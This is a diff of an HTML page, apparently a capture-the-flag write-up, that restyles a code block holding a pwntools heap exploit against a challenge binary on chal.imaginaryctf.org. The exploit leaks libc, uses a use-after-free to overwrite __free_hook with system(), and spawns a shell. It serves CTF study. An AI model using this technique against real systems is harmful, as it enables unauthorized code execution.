@@ -56,62 +56,47 @@
 <div>
     <img src="../imgs/imaginary/pile3.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-#!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>
 
-from pwn import *
-elf = context.binary = ELF('./vuln')
-libc = elf.libc
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./vuln'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
 
-p = remote('chal.imaginaryctf.org',42007)
+<span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(</span><span style="color: #2aa198">'chal.imaginaryctf.org'</span><span style="color: #839496">,</span><span style="color: #2aa198">42007</span><span style="color: #839496">)</span>
 
-#====================Healper_Functions=============================#
+<span style="color: #586e75; font-style: italic">#====================Healper_Functions=============================#</span>
 
-def malloc(index):
-    p.sendline('1')
-    p.sendline(f"{index}")
+<span style="color: #859900">def</span> <span style="color: #268bd2">malloc</span><span style="color: #839496">(index):</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">f"{</span><span style="color: #839496">index</span><span style="color: #2aa198">}"</span><span style="color: #839496">)</span>
 
-def free(index):
-    p.sendline('2')
-    p.sendline(f"{index}")
+<span style="color: #859900">def</span> <span style="color: #268bd2">free</span><span style="color: #839496">(index):</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'2'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">f"{</span><span style="color: #839496">index</span><span style="color: #2aa198">}"</span><span style="color: #839496">)</span>
 
-def edit(index, value):
-    p.sendline('3')
-    p.sendline(f"{index}")
-    p.sendline(value)
+<span style="color: #859900">def</span> <span style="color: #268bd2">edit</span><span style="color: #839496">(index,</span> <span style="color: #839496">value):</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'3'</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">f"{</span><span style="color: #839496">index</span><span style="color: #2aa198">}"</span><span style="color: #839496">)</span>
+    <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(value)</span>
 
-#==========================Exploit==================================#
+<span style="color: #586e75; font-style: italic">#==========================Exploit==================================#</span>
 
-p.recvuntil('...\n')
-data = p.recvline().strip()
-libc.address = int(data,16) - libc.sym['printf']
-print("[+] Libc Address: " + hex(libc.address))
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'...\n'</span><span style="color: #839496">)</span>
+<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvline()</span><span style="color: #586e75">.</span><span style="color: #839496">strip()</span>
+<span style="color: #839496">libc</span><span style="color: #586e75">.</span><span style="color: #839496">address</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">int</span><span style="color: #839496">(data,</span><span style="color: #2aa198">16</span><span style="color: #839496">)</span> <span style="color: #586e75">-</span> <span style="color: #839496">libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym[</span><span style="color: #2aa198">'printf'</span><span style="color: #839496">]</span>
+<span style="color: #268bd2">print</span><span style="color: #839496">(</span><span style="color: #2aa198">"[+] Libc Address: "</span> <span style="color: #586e75">+</span> <span style="color: #268bd2">hex</span><span style="color: #839496">(libc</span><span style="color: #586e75">.</span><span style="color: #839496">address))</span>
 
-malloc(0)
-free(0)
-edit(0,p64(libc.sym.__free_hook))   #UAF to overwrite tcachebin fd
-malloc(1)
-malloc(2)
-edit(2,p64(libc.sym.system))        #Write system() into free hook
-edit(0,b'/bin/sh\0')
-free(0)                             #System('/bin/sh')
+<span style="color: #839496">malloc(</span><span style="color: #2aa198">0</span><span style="color: #839496">)</span>
+<span style="color: #839496">free(</span><span style="color: #2aa198">0</span><span style="color: #839496">)</span>
+<span style="color: #839496">edit(</span><span style="color: #2aa198">0</span><span style="color: #839496">,p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">__free_hook))</span>   <span style="color: #586e75; font-style: italic">#UAF to overwrite tcachebin fd</span>
+<span style="color: #839496">malloc(</span><span style="color: #2aa198">1</span><span style="color: #839496">)</span>
+<span style="color: #839496">malloc(</span><span style="color: #2aa198">2</span><span style="color: #839496">)</span>
+<span style="color: #839496">edit(</span><span style="color: #2aa198">2</span><span style="color: #839496">,p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">system))</span>        <span style="color: #586e75; font-style: italic">#Write system() into free hook</span>
+<span style="color: #839496">edit(</span><span style="color: #2aa198">0</span><span style="color: #839496">,</span><span style="color: #2aa198">b'/bin/sh\0'</span><span style="color: #839496">)</span>
+<span style="color: #839496">free(</span><span style="color: #2aa198">0</span><span style="color: #839496">)</span>                             <span style="color: #586e75; font-style: italic">#System('/bin/sh')</span>
 
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <br><br>
 
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
